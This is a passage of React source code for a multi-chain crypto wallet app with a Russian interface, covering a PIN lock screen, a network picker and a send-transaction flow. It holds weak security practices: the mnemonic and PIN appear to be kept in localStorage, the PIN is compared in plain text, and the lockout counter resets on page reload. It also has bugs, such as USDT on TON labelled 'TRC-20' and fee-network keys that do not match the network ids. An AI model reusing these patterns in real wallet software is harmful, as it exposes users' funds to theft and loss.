  // eslint-disable-next-line react-hooks/exhaustive-deps

  }, []); // run once on mount — handler always calls latest onClose via ref

  return (

    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.85)",zIndex:200,

      display:"flex",alignItems:"flex-end",animation:"fadeIn 0.2s ease"}}>

      <div style={{width:"100%",background:"#111",borderRadius:"24px 24px 0 0",

        padding:"0 0 env(safe-area-inset-bottom, 48px) 0",paddingBottom:"max(48px,env(safe-area-inset-bottom))",

        animation:"slideUp 0.35s cubic-bezier(.16,1,.3,1)",

        maxHeight:"92dvh",overflowY:"auto",WebkitOverflowScrolling:"touch"}}>

        <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"20px 24px 0"}}>

          <h3 style={{fontSize:18,fontWeight:700,color:"#fff",margin:0}}>{title}</h3>

          <button onClick={onClose} style={{background:"#222",border:"none",borderRadius:"50%",

            width:32,height:32,display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}}>

            <X size={16} color="rgba(255,255,255,0.6)"/>

          </button>

        </div>

        {children}

      </div>

    </div>

  );

}



function Toast({ msg, type="success", onDone }) {

  useEffect(()=>{const t=setTimeout(onDone,3000);return()=>clearTimeout(t);},[]);

  const colors = {success:"#22C55E",error:"#EF4444",info:"#8B9CF7"};

  return (

    <div style={{position:"fixed",top:60,left:"50%",transform:"translateX(-50%)",zIndex:999,

      background:"#1a1a1a",border:`1px solid ${colors[type]}44`,borderRadius:14,

      padding:"12px 20px",display:"flex",alignItems:"center",gap:10,

      animation:"slideDown 0.3s cubic-bezier(.16,1,.3,1)",maxWidth:320,boxShadow:"0 8px 32px rgba(0,0,0,0.6)"}}>

      {type==="success"&&<CheckCircle size={18} color="#22C55E"/>}

      {type==="error"&&<AlertCircle size={18} color="#EF4444"/>}

      {type==="info"&&<Zap size={18} color="#8B9CF7"/>}

      <span style={{fontSize:13,color:"#fff",fontWeight:500}}>{msg}</span>

    </div>

  );

}



// ─── PIN LOCK ─────────────────────────────────────────────────────────────────

function PinLock({ savedPin, onUnlock, onSetPin, onResetWallet }) {

  const [digits,setDigits]=useState([]);

  const [error,setError]=useState(false);

  const [shake,setShake]=useState(false);

  const [attempts,setAttempts]=useState(0);

  const [isLocked,setIsLocked]=useState(false);

  

  const MAX_ATTEMPTS = 3;

  

  // Avatar from localStorage

  const avatar=localStorage.getItem(storageKey("avatar"))||"crystal";

  const avatarBg=localStorage.getItem(storageKey("avatarBg"))||"graphite";

  const bgOptions={

    graphite:"linear-gradient(135deg,#374151,#1f2937)",

    gradient:"linear-gradient(135deg,#2563eb,#7c3aed)",

    purple:"linear-gradient(135deg,#7c3aed,#ec4899)",

    green:"linear-gradient(135deg,#22C55E,#16a34a)",

    orange:"linear-gradient(135deg,#F59E0B,#EF4444)",

    dark:"linear-gradient(135deg,#1f2937,#111827)",

    blue:"linear-gradient(135deg,#0ea5e9,#2563eb)",

  };

  const currentBg=bgOptions[avatarBg]||bgOptions.graphite;

  const avatarIcons={

    crystal:<CrystalIcon size={52}/>,

    gem:<GemLogo size={28}/>,

    diamond:<Diamond size={28} color="#2563eb"/>,

    user:<UserCircle size={28} color="#8B9CF7"/>,

    zap:<Zap size={28} color="#F59E0B"/>,

  };

  const currentAvatar=avatarIcons[avatar]||avatarIcons.crystal;



  function press(d) {

    if(digits.length>=6 || isLocked)return;

    const next=[...digits,d];

    setDigits(next);

    if(next.length===6) {

      const code=next.join("");

      setTimeout(()=>{

        if(!savedPin) { onSetPin(code); }

        else if(code===savedPin) { 

          setAttempts(0);

          onUnlock(); 

        }

        else {

          const newAttempts = attempts + 1;

          setAttempts(newAttempts);

          setError(true); setShake(true);

          

          if(newAttempts >= MAX_ATTEMPTS) {

            setIsLocked(true);

          }

          

          setTimeout(()=>{setDigits([]);setError(false);setShake(false);},600);

        }

      },150);

    }

  }

  function del() { if(!isLocked) setDigits(d=>d.slice(0,-1)); }



  return (

    <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",

      alignItems:"center",justifyContent:"center",padding:"32px 24px"}}>

      <div style={{marginBottom:16,display:"flex",alignItems:"center",justifyContent:"center"}}>

        <div style={{width:72,height:72,borderRadius:20,background:currentBg,display:"flex",alignItems:"center",justifyContent:"center",border:"2px solid rgba(255,255,255,0.1)"}}>

          {currentAvatar}

        </div>

      </div>

      <h2 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 6px"}}>

        {savedPin?"Enter PIN":"Create PIN"}

      </h2>

      <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:"0 0 40px",textAlign:"center"}}>

        {savedPin?"Enter your 6-digit PIN to unlock":"Set a 6-digit PIN to protect your wallet"}

      </p>

      <div style={{display:"flex",gap:12,marginBottom:40,

        animation:shake?"shake 0.4s ease":"none"}}>

        {Array.from({length:6},(_,i)=>(

          <div key={i} style={{width:14,height:14,borderRadius:"50%",

            background:i<digits.length?(error?"#EF4444":"#2563eb"):"rgba(255,255,255,0.15)",

            transition:"background 0.15s",border:"1.5px solid rgba(255,255,255,0.1)"}}/>

        ))}

      </div>

      <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,maxWidth:280,width:"100%"}}>

        {[1,2,3,4,5,6,7,8,9,"",0,"⌫"].map((k,i)=>(

          <button key={i} onClick={()=>k==="⌫"?del():k!==""?press(String(k)):null}

            disabled={k===""}

            style={{height:72,borderRadius:20,border:"none",

              background:k===""?"transparent":k==="⌫"?"rgba(255,255,255,0.06)":"rgba(255,255,255,0.08)",

              color:"#fff",fontSize:k==="⌫"?20:24,fontWeight:500,cursor:k===""?"default":"pointer",

              transition:"background 0.15s,transform 0.1s"}}

            onMouseDown={e=>k!==""&&(e.currentTarget.style.background="rgba(255,255,255,0.15)")}

            onMouseUp={e=>e.currentTarget.style.background=k==="⌫"?"rgba(255,255,255,0.06)":"rgba(255,255,255,0.08)"}>

            {k}

          </button>

        ))}

      </div>

      

      {/* Lockout message and reset option */}

      {isLocked && (

        <div style={{textAlign:"center",marginTop:24,padding:"0 20px"}}>

          <div style={{background:"#EF444422",border:"1px solid #EF4444",borderRadius:12,padding:16,marginBottom:16}}>

            <p style={{color:"#EF4444",fontSize:14,margin:0,fontWeight:600}}>

              🔒 Too many failed attempts

            </p>

            <p style={{color:"rgba(255,255,255,0.7)",fontSize:13,margin:"8px 0 0"}}>

              PIN is locked. Create a new wallet to continue.

            </p>

          </div>

          <button 

            onClick={()=>{

              if(confirm("⚠️ This will delete your current wallet data!\n\nMake sure you have your recovery phrase backed up, or you will lose access to your funds forever.\n\nAre you sure you want to create a new wallet?")){

                // Clear all wallet data

                localStorage.removeItem("gem_wallet_mnemonic");

                localStorage.removeItem("gem_wallet_pin");

                localStorage.removeItem("gem_wallet_pin_hash");

                localStorage.removeItem("gem_wallet_backup_shards");

                localStorage.removeItem("gem_has_wallet");

                localStorage.removeItem("gem_wallet_created");

                localStorage.removeItem("gem_user_id");

                localStorage.removeItem("gem_avatar_emoji");

                localStorage.removeItem("gem_avatar_bg");

                localStorage.removeItem("gem_nfts");

                localStorage.removeItem("gem_tx_history");

                localStorage.removeItem("gem_balances");

                localStorage.removeItem("gem_admin_notifications");

                sessionStorage.clear();

                window.location.reload();

              }

            }}

            style={{width:"100%",maxWidth:280,padding:16,borderRadius:14,border:"1px solid rgba(239,68,68,0.5)",

              background:"linear-gradient(135deg,#EF444433 0%,#DC262633 100%)",color:"#FCA5A5",

              fontSize:15,fontWeight:600,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",gap:8,marginBottom:12}}>

            <Trash2 size={18}/> Create New Wallet

          </button>

        </div>

      )}

      

      {/* Attempt counter */}

      {savedPin && !isLocked && attempts > 0 && (

        <p style={{color:"#F59E0B",fontSize:13,marginTop:16,textAlign:"center"}}>

          Attempt {attempts} of {MAX_ATTEMPTS}

        </p>

      )}

    </div>

  );

}



// ─── NETWORK DATA ─────────────────────────────────────────────────────────────

const ASSET_NETWORKS = {

  ETH:  [{ id:"eth",  label:"Ethereum",  short:"ETH",    color:"#8B9CF7", placeholder:"0x… (42 chars)" }],

  TON:  [{ id:"ton",  label:"TON",       short:"TON",    color:"#0098EA", placeholder:"EQ… (48 chars)" }],

  BNB:  [{ id:"bnb",  label:"BNB Chain", short:"BNB",    color:"#F3BA2F", placeholder:"0x… (42 chars)" }],

  LTC:  [{ id:"ltc",  label:"Litecoin",  short:"LTC",    color:"#BFBBBB", placeholder:"L… (34 chars)"  }],

  ARB:  [{ id:"arb",  label:"Arbitrum",  short:"ARB",    color:"#28A0F0", placeholder:"0x… (42 chars)" }],

  SOL:  [{ id:"sol",  label:"Solana",    short:"SOL",    color:"#B57BFF", placeholder:"…  (44 chars)"  }],

  USDT: [

    { id:"eth",  label:"Ethereum",  short:"ERC-20", color:"#8B9CF7", placeholder:"0x… (42 chars)" },

    { id:"ton",  label:"TON",       short:"TRC-20", color:"#0098EA", placeholder:"EQ… (48 chars)" },

    { id:"bnb",  label:"BNB Chain", short:"BEP-20", color:"#F3BA2F", placeholder:"0x… (42 chars)" },

    { id:"arb",  label:"Arbitrum",  short:"ARB",    color:"#28A0F0", placeholder:"0x… (42 chars)" },

    { id:"sol",  label:"Solana",    short:"SPL",    color:"#B57BFF", placeholder:"…  (44 chars)"  },

  ],

};



// ─── NETWORK PICKER ───────────────────────────────────────────────────────────

function NetworkPicker({ sym, selected, onSelect }) {

  const nets = ASSET_NETWORKS[sym] || [];

  if(!nets.length) return null;

  // auto-select first if nothing selected yet

  const cur = selected || nets[0];

  return (

    <div>

      <p style={{fontSize:11,color:"rgba(255,255,255,0.35)",margin:"0 0 8px",

        fontWeight:600,letterSpacing:"0.06em",textTransform:"uppercase"}}>Network</p>

      <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>

        {nets.map(net=>{

          const active = cur.id===net.id;

          return (

            <button key={net.id} onClick={()=>onSelect(net)}

              style={{display:"flex",alignItems:"center",gap:6,padding:"8px 12px",

                borderRadius:12,cursor:"pointer",transition:"all 0.18s",

                background:active?`${net.color}1a`:"rgba(255,255,255,0.04)",

                border:active?`1px solid ${net.color}55`:"1px solid rgba(255,255,255,0.08)"}}>

              <div style={{width:7,height:7,borderRadius:"50%",background:net.color,flexShrink:0,

                boxShadow:active?`0 0 7px ${net.color}`:"none",transition:"box-shadow 0.18s"}}/>

              <span style={{fontSize:12,fontWeight:600,

                color:active?net.color:"rgba(255,255,255,0.5)",transition:"color 0.18s"}}>{net.label}</span>

              <span style={{fontSize:10,color:"rgba(255,255,255,0.28)",background:"rgba(255,255,255,0.07)",

                borderRadius:5,padding:"1px 5px",fontWeight:500}}>{net.short}</span>

            </button>

          );

        })}

      </div>

    </div>

  );

}



// ─── SEND MODAL ───────────────────────────────────────────────────────────────

function SendModal({ onClose, assets, prices, onSend, addresses, mnemonic, network, testMode }) {
  const [step,setStep]=useState(1);
  const [sel,setSel]=useState(assets?.[0] || {sym: "ETH", id: "eth"});
  const [to,setTo]=useState("");
  const [amt,setAmt]=useState("");
  const [done,setDone]=useState(false);
  const [sending,setSending]=useState(false);
  const [txHash,setTxHash]=useState("");
  const [selectedNet,setSelectedNet]=useState(()=>ASSET_NETWORKS[assets?.[0]?.sym]?.[0]||null);
  const [addrError,setAddrError]=useState("");
  const [showScanner,setShowScanner]=useState(false);
  const [customFee, setCustomFee] = useState("");
  const [feeDisplay, setFeeDisplay] = useState("");
  const [feeMode, setFeeMode] = useState("standard"); // "standard" | "custom"
  const [feeSpeed,setFeeSpeed]=useState("medium");

  // Derive values safely
  const currentSym = sel?.sym || "ETH";
  const assetObj = assets.find(a=>a.sym===currentSym)||assets[0]||{balance:0};
  const price = prices[currentSym]||0;
  const nets = ASSET_NETWORKS[currentSym]||[];
  const curNet = selectedNet || nets[0] || null;

  // Real units mapping for Russian UI
  const FEE_UNITS = {
    TON: { unit: "nanoton", kind: "ton" },
    ETH: { unit: "gwei", kind: "evm", limit: 21000 },
    BNB: { unit: "gwei", kind: "evm", limit: 21000 },
    SOL: { unit: "micro-lamports", kind: "sol" },
    ARB: { unit: "gwei", kind: "evm", limit: 21000 },
    LTC: { unit: "sat/byte", kind: "ltc", bytes: 250 },
    USDT: { unit: "gwei", kind: "evm", limit: 65000 }
  };

  const feeConfig = FEE_UNITS[currentSym] || { unit: "gwei", kind: "evm", limit: 21000 };
  const unit = feeConfig.unit;

  const getNetworkFee = () => {
    if (feeMode === "custom") return parseFloat(customFee) || 0;
    
    if (currentSym === 'USDT' && curNet) {
      const networkMap = { 'ethereum': 'ETH', 'bsc': 'BNB', 'arbitrum': 'ARB', 'solana': 'SOL', 'ton': 'TON' };
      const feeSymbol = networkMap[curNet.id] || 'ETH';
      const fees = NETWORK_FEES[feeSymbol] || NETWORK_FEES.ETH;
      return fees[feeSpeed] || fees.medium;
    }
    const fees = NETWORK_FEES[currentSym] || NETWORK_FEES.ETH;
    return fees[feeSpeed] || fees.medium;
  };

  const getFeeUsd = (val) => {
    if (!feeConfig) return 0;
    const v = parseFloat(val) || 0;
    if (feeConfig.kind === "evm") return (v * feeConfig.limit * price) / 1e9;
    if (feeConfig.kind === "ltc") return (v * feeConfig.bytes * price) / 1e8;
    if (feeConfig.kind === "ton") return (v * price) / 1e9;
    if (feeConfig.kind === "sol") return (v * price) / 1e9; // Simplified
    return v * price;
  };

  const getMultiplier = () => {
    const fees = NETWORK_FEES[currentSym] || NETWORK_FEES.ETH;
    if (fees.medium >= 1000000) return { factor: 1000000, label: "M" };
    if (fees.medium >= 1000) return { factor: 1000, label: "K" };
    return { factor: 1, label: "" };
  };

  const fmtFee = (val) => {
    const v = parseFloat(val) || 0;
    if (v >= 1000000) return (v / 1000000).toFixed(0) + "M";
    if (v >= 1000) return (v / 1000).toFixed(0) + "K";
    return v.toString();
  };

  const fee = getNetworkFee();
  const feeUsd = getFeeUsd(fee);

  const getTimer = (speedType) => {
    if (speedType === "custom") {
      const val = parseFloat(customFee) || 0;
      const fees = NETWORK_FEES[currentSym] || NETWORK_FEES.ETH;
      if (val === 0) return "—";
      if (val <= fees.low) return "60 мин";
      if (val >= fees.high) return "15 мин";
      if (val < fees.medium) return "45 мин";
      return "30 мин";
    }
    const estimates = SPEED_ESTIMATES[currentSym] || SPEED_ESTIMATES.ETH;
    return estimates[speedType || feeSpeed] || "1-2 мин";
  };

  const getFeeInNativeToken = () => {
    if (currentSym === 'USDT' && curNet) {
      const nativePrice = prices[curNet.native] || prices.ETH || 0;
      return nativePrice > 0 ? feeUsd / nativePrice : 0;
    }
    const tokenPrice = prices[currentSym] || 0;
    return tokenPrice > 0 ? feeUsd / tokenPrice : 0;
  };

  // Auto-detect network by address
  useEffect(() => {
    if (to.length >= 10) {
      if (/^(EQ|UQ)[a-zA-Z0-9_-]{43,46}$/.test(to)) {
        const tonAsset = assets.find(a => a.sym === 'TON');
        if (tonAsset) setSel(tonAsset);
      } else if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(to)) {
        const solAsset = assets.find(a => a.sym === 'SOL');
        if (solAsset) setSel(solAsset);
      } else if (/^0x[a-fA-F0-9]{40}$/.test(to)) {
        // Keep current asset if it's already EVM, otherwise default to ETH
        if (!['ETH', 'BNB', 'ARB', 'USDT'].includes(currentSym)) {
          const ethAsset = assets.find(a => a.sym === 'ETH');
          if (ethAsset) setSel(ethAsset);
        }
      }
    }
  }, [to]);

  function handleSelAsset(a) {
    setSel(a);
    setTo("");
    setSelectedNet(ASSET_NETWORKS[a.sym]?.[0]||null);
  }

  function handleToChange(val) {
    setTo(val);
    if (val && !isValidAddress(val, currentSym)) {
      setAddrError(`Неверный формат адреса ${currentSym}`);
    } else {
      setAddrError("");
    }
  }

  function next() {
    if(step===1){
      if(!to){ setAddrError("Введите адрес получателя"); return; }
      if(!isValidAddress(to, sel.sym)){ setAddrError(`Неверный формат адреса ${sel.sym}`); return; }
      setAddrError("");
      setStep(2);
    }
    else if(step===2){
      if(!amt || parseFloat(amt) <= 0){ alert("Введите корректную сумму"); return; }
      setStep(3);
    }
    else if(step===3){
      setStep(4);
    }
    else if(step===4) {
      const num=parseFloat(amt);
      const feeInNative = getFeeInNativeToken();
      const totalNeeded = num + feeInNative;
      
      if(totalNeeded > assetObj.balance){
        alert(`Недостаточно средств. Нужно ${fmt(totalNeeded, 6)} ${sel.sym} (включая комиссию ~${feeInNative.toFixed(6)} ${sel.sym} ≈ $${fee})`);
        return;
      }

      setSending(true);
      async function doSend(){
        try{
          const assetMeta = ASSET_META.find(a=>a.sym===sel.sym);
          const privateKey = await getPrivateKey(mnemonic.join(" "), sel.sym, network);
          const fromAddr = addresses?.[assetMeta.id];
          const hash = await chainSendTransaction({ 
            sym: sel.sym, from: fromAddr, to, 
            amount: num, privateKey, networkId: assetMeta.id,
            fee: fee // Pass custom fee if needed
          });
          if(hash){
            onSend({ sym:sel.sym, amount:num, to, usd:num*price, hash });
            setDone(true);
            setTimeout(onClose,2500);
          }
        }catch(e){ alert("Ошибка отправки: "+(e?.message||"Неизвестная ошибка")); }
        finally{ setSending(false); }
      }
      doSend();
    }
  }

  return (
    <Sheet onClose={onClose} title={done?"Отправлено!":"Отправить"}>
      {showScanner&&(
        <QRScanner onScan={(data)=>{handleToChange(data);setShowScanner(false);}} onClose={()=>setShowScanner(false)}/>
      )}
      {done?(
        <div style={{padding:"48px 24px",textAlign:"center"}}>
          <div style={{width:80,height:80,borderRadius:"50%",background:"linear-gradient(135deg,#22c55e,#16a34a)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 16px"}}><Check size={40} color="#fff"/></div>
          <p style={{color:"#22C55E",fontSize:20,fontWeight:700,margin:0}}>Транзакция отправлена!</p>
          <p style={{color:"rgba(255,255,255,0.4)",fontSize:13,marginTop:8}}>Трансляция в сеть...</p>
        </div>
      ):(
        <div style={{padding:"20px 24px"}}>
          <div style={{display:"flex",gap:8,marginBottom:24}}>
            {[1,2,3,4].map(s=>(
              <div key={s} style={{flex:1,height:3,borderRadius:2,
                background:s<=step?"#2563eb":"rgba(255,255,255,0.1)",transition:"background 0.3s"}}/>
            ))}
          </div>

          {step===1&&(
            <div style={{display:"flex",flexDirection:"column",gap:16}}>
              <p style={{fontSize:13,color:"rgba(255,255,255,0.45)",margin:0}}>Выберите актив и получателя</p>
              <div style={{background:"#1a1a1a",borderRadius:14,padding:"6px",display:"flex",gap:4,flexWrap:"wrap"}}>
                {assets.map(a=>(
                  <button key={a.id} onClick={()=>handleSelAsset(a)} style={{padding:"8px 12px",borderRadius:10,border:"none",
                    background:sel.id===a.id?"#2563eb":"transparent",
                    color:sel.id===a.id?"#fff":"rgba(255,255,255,0.5)",
                    fontSize:12,fontWeight:600,cursor:"pointer"}}>{a.sym}</button>
                ))}
              </div>
              {nets.length>1&&(
                <div style={{background:"#1a1a1a",borderRadius:14,padding:"14px 16px",
                  border:"1px solid rgba(255,255,255,0.06)"}}>
                  <NetworkPicker sym={sel.sym} selected={curNet} onSelect={setSelectedNet}/>
                </div>
              )}
              <div style={{position:"relative"}}>
                <input value={to} onChange={e=>handleToChange(e.target.value)}
                  placeholder={curNet?.placeholder||"Адрес получателя"}
                  style={{width:"100%",padding:`16px ${curNet?105:48}px 16px 16px`,borderRadius:14,
                    border:`1px solid ${addrError?"#ef4444":curNet?curNet.color+"33":"rgba(255,255,255,0.1)"}`,
                    background:"#1a1a1a",color:"#fff",fontSize:14,outline:"none",
                    fontFamily:"monospace",boxSizing:"border-box",transition:"border-color 0.2s"}}/>
                <button onClick={()=>setShowScanner(true)}
                  style={{position:"absolute",top:8,right:8,padding:8,borderRadius:10,
                    background:"rgba(255,255,255,0.1)",border:"none",cursor:"pointer",
                    display:"flex",alignItems:"center",justifyContent:"center"}}>
                  <Scan size={18} color="#2563eb"/>
                </button>
                {addrError&&<p style={{color:"#ef4444",fontSize:12,margin:"6px 0 0"}}>{addrError}</p>}
                {curNet&&(
                  <div style={{position:"absolute",top:10,right:48,
                    display:"flex",alignItems:"center",gap:4,
                    background:`${curNet.color}18`,borderRadius:8,padding:"3px 8px",
                    border:`1px solid ${curNet.color}33`}}>
                    <div style={{width:5,height:5,borderRadius:"50%",background:curNet.color}}/>
                    <span style={{fontSize:10,color:curNet.color,fontWeight:600}}>{curNet.short}</span>
                  </div>
                )}
              </div>
              <div style={{background:"#1a1a1a",borderRadius:12,padding:"12px 14px",border:"1px solid rgba(255,255,255,0.06)"}}>
                <p style={{fontSize:11,color:"rgba(255,255,255,0.35)",margin:"0 0 4px"}}>Доступно</p>
                <p style={{fontSize:15,fontWeight:600,color:"#fff",margin:0}}>{fmt(assetObj.balance,6)} {sel.sym} <span style={{color:"rgba(255,255,255,0.4)",fontSize:13}}>≈ {fmtUSD(assetObj.balance*price)}</span></p>
              </div>
            </div>
          )}

          {step===2&&(
            <div style={{display:"flex",flexDirection:"column",gap:16}}>
              <div style={{display:"flex",justifyContent:"space-between"}}>
                <p style={{fontSize:13,color:"rgba(255,255,255,0.45)",margin:0}}>Сумма</p>
                <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>Баланс: {fmt(assetObj.balance,6)} {sel.sym}</span>
              </div>
              <div style={{background:"#1a1a1a",borderRadius:16,padding:"20px",border:"1px solid rgba(255,255,255,0.08)"}}>
                <div style={{display:"flex",alignItems:"center",gap:12}}>
                  <CoinIcon asset={sel} size={36}/>
                  <input value={amt} onChange={e=>setAmt(e.target.value)} placeholder="0.00" type="number" min="0"
                    style={{flex:1,background:"none",border:"none",outline:"none",color:"#fff",fontSize:28,fontWeight:700}}/>
                  <span style={{fontSize:16,fontWeight:600,color:"rgba(255,255,255,0.4)"}}>{sel.sym}</span>
                </div>
                {amt&&<p style={{fontSize:13,color:"rgba(255,255,255,0.35)",margin:"8px 0 0"}}>≈ {fmtUSD(parseFloat(amt||0)*price)}</p>}
              </div>
              <div style={{display:"flex",gap:8}}>
                {["25%","50%","75%","MAX"].map(p=>(
                  <button key={p} onClick={()=>setAmt(fmtCrypto(assetObj.balance*(p==="MAX"?1:parseInt(p)/100)))}
                    style={{flex:1,padding:"8px",borderRadius:10,border:"1px solid rgba(255,255,255,0.1)",
                      background:"#1a1a1a",color:"rgba(255,255,255,0.6)",fontSize:12,fontWeight:600,cursor:"pointer"}}>{p}</button>
                ))}
              </div>
            </div>
          )}

          {step===3&&(
            <div style={{display:"flex",flexDirection:"column",gap:16}}>
              <p style={{fontSize:13,color:"rgba(255,255,255,0.45)",margin:0}}>Выберите комиссию</p>
              
              <div style={{display:"flex",flexDirection:"column",gap:10}}>
                {["low","medium","high"].map((speed)=>{
                  const fees = NETWORK_FEES[sel.sym] || NETWORK_FEES.ETH;
                  const feeValue = fees[speed];
                  const isSelected = feeMode === "standard" && feeSpeed === speed;
                  const labels = { low: "Медленно", medium: "Стандартно", high: "Быстро" };
                  
                  return (
                    <button key={speed} onClick={()=>{setFeeMode("standard"); setFeeSpeed(speed);}}
                      style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"16px",
                        borderRadius:14,border:isSelected?`2px solid #2563eb`:"1px solid rgba(255,255,255,0.1)",
                        background:isSelected?"rgba(37,99,235,0.1)":"#1a1a1a",cursor:"pointer"}}>
                      <div style={{textAlign:"left"}}>
                        <div style={{fontSize:15,fontWeight:600,color:"#fff"}}>{labels[speed]}</div>
                        <div style={{fontSize:12,color:"#f59e0b"}}>~{getTimer(speed)}</div>
                      </div>
                      <div style={{textAlign:"right"}}>
                        <div style={{fontSize:14,fontWeight:600,color:"#fff"}}>{fmtFee(feeValue)} {unit}</div>
                        <div style={{fontSize:11,color:"rgba(255,255,255,0.4)"}}>≈ {fmtUSD(getFeeUsd(feeValue))}</div>
                      </div>
                    </button>
                  );
                })}

                <div style={{borderRadius:14,padding:16,background:feeMode==="custom"?"rgba(37,99,235,0.1)":"#1a1a1a",
                  border:feeMode==="custom"?"2px solid #2563eb":"1px solid rgba(255,255,255,0.1)"}}>
                  <button onClick={()=>setFeeMode("custom")} style={{width:"100%",background:"none",border:"none",
                    display:"flex",justifyContent:"space-between",alignItems:"center",padding:0,cursor:"pointer"}}>
                    <div style={{textAlign:"left"}}>
                      <div style={{fontSize:15,fontWeight:600,color:"#fff"}}>Кастомная комиссия</div>
                      <div style={{fontSize:12,color:"#f59e0b"}}>~{getTimer("custom")}</div>
                    </div>
                    <div style={{textAlign:"right"}}>
                      <div style={{fontSize:14,fontWeight:600,color:"#fff"}}>{customFee ? `${fmtFee(customFee)} ${unit}` : "Введите сумму"}</div>
                      {customFee && <div style={{fontSize:11,color:"rgba(255,255,255,0.4)"}}>≈ {fmtUSD(getFeeUsd(customFee))}</div>}
                    </div>
                  </button>
                  {feeMode==="custom"&&(
                    <div style={{marginTop:12,position:"relative"}}>
                      <input value={feeDisplay} onChange={e=>{
                        const val = e.target.value;
                        setFeeDisplay(val);
                        const mult = getMultiplier();
                        setCustomFee(parseFloat(val || 0) * mult.factor);
                      }} 
                        placeholder={`В ${getMultiplier().label || ""} ${unit}`} type="number"
                        style={{width:"100%",padding:"12px 40px 12px 12px",borderRadius:10,background:"#000",
                          border:"1px solid #333",color:"#fff",outline:"none",boxSizing:"border-box"}}/>
                      <span style={{position:"absolute",right:12,top:"50%",transform:"translateY(-50%)",
                        fontSize:14,color:"rgba(255,255,255,0.4)",fontWeight:600}}>{getMultiplier().label}</span>
                    </div>
                  )}
                </div>
              </div>

              <div style={{padding:"14px",background:"rgba(245,158,11,0.1)",borderRadius:12,textAlign:"center",border:"1px solid rgba(245,158,11,0.2)"}}>
                <span style={{fontSize:13,color:"#f59e0b",fontWeight:600}}>
                   Итого к оплате: {fee} {unit} (≈ {fmtUSD(feeUsd)})
                </span>
              </div>
            </div>
          )}

          {step===4&&(
            <div style={{display:"flex",flexDirection:"column",gap:10}}>
              <p style={{fontSize:13,color:"rgba(255,255,255,0.45)",margin:0}}>Проверьте детали</p>
              <div style={{display:"flex",flexDirection:"column",gap:8,background:"#1a1a1a",borderRadius:16,padding:16,border:"1px solid rgba(255,255,255,0.06)"}}>
                <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start"}}>
                  <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>Получатель</span>
                  <div style={{textAlign:"right"}}>
                    <span style={{fontSize:13,color:"#fff",fontWeight:500,display:"block"}}>{shortAddr(to)}</span>
                    <button onClick={()=>setStep(1)} style={{fontSize:11,color:"#2563eb",background:"none",border:"none",padding:0,cursor:"pointer"}}>Изменить</button>
                  </div>
                </div>
                <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginTop:8}}>
                  <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>Сумма перевода</span>
                  <div style={{textAlign:"right"}}>
                    <span style={{fontSize:13,color:"#fff",fontWeight:600}}>{amt} {sel.sym}</span>
                    <button onClick={()=>setStep(2)} style={{fontSize:11,color:"#2563eb",background:"none",border:"none",padding:"0 0 0 8px",cursor:"pointer"}}>Изменить</button>
                  </div>
                </div>
                <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginTop:8}}>
                  <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>Комиссия</span>
                  <div style={{textAlign:"right"}}>
                    <span style={{fontSize:13,color:"#fff",fontWeight:600}}>{fee} {unit}</span>
                    <button onClick={()=>setStep(3)} style={{fontSize:11,color:"#2563eb",background:"none",border:"none",padding:"0 0 0 8px",cursor:"pointer"}}>Изменить</button>
                  </div>
                </div>
                <div style={{height:1,background:"rgba(255,255,255,0.06)",margin:"8px 0"}}/>
                <div style={{display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                  <span style={{fontSize:14,color:"#fff",fontWeight:600}}>Итого (в USD)</span>
                  <span style={{fontSize:16,color:"#10b981",fontWeight:700}}>{fmtUSD(parseFloat(amt||0)*price+feeUsd)}</span>
                </div>
              </div>
              <div style={{padding:12,background:"rgba(239,68,68,0.1)",borderRadius:10,border:"1px solid rgba(239,68,68,0.2)"}}>
                <p style={{fontSize:11,color:"#ef4444",margin:0,textAlign:"center"}}>Транзакция необратима. Проверьте адрес перед отправкой.</p>
              </div>
            </div>
          )}

          <div style={{display:"flex",gap:12,marginTop:24}}>
            {step > 1 && (
              <button onClick={()=>setStep(s=>s-1)} 
                style={{flex:1,padding:"17px",borderRadius:16,background:"rgba(255,255,255,0.08)",border:"none",color:"#fff",fontSize:15,fontWeight:600,cursor:"pointer"}}>Назад</button>
            )}
            <button onClick={next} disabled={(step===1&&(!to||addrError))||(step===2&&!amt)||sending}
              style={{flex:2,padding:"17px",borderRadius:16,border:"none",
                background:(step===1&&(!to||addrError))||(step===2&&!amt)||sending?"rgba(255,255,255,0.08)":"linear-gradient(135deg,#2563eb,#7c3aed)",
                color:"#fff",fontSize:15,fontWeight:600,cursor:(step===1&&(!to||addrError))||(step===2&&!amt)||sending?"not-allowed":"pointer",
                opacity:(step===1&&(!to||addrError))||(step===2&&!amt)||sending?0.5:1}}>
              {step===4?(sending?"Отправка...":"Подтвердить"): (step===1 && to && !addrError) ? "Далее" : step === 2 ? "Далее" : step === 3 ? "К подтверждению" : "Продолжить"}
            </button>
          </div>
        </div>
      )}
    </Sheet>
  );
}

// Maps USDT network id → wallet address key

const USDT_NET_ADDR = { eth:"ETH", ton:"TON", bnb:"BNB", arb:"ARB", sol:"SOL" };



// Per-asset: which address key to use

const ASSET_ADDR_KEY = { ETH:"ETH", TON:"TON", BNB:"BNB", ARB:"ARB", SOL:"SOL", LTC:"LTC" };



// Visual meta for the asset selector row

const RECEIVE_ASSETS = [

  { sym:"ETH",  color:"#8B9CF7", icon:"Ξ"  },

  { sym:"TON",  color:"#0098EA", icon:"◆"  },

  { sym:"BNB",  color:"#F3BA2F", icon:"◈"  },

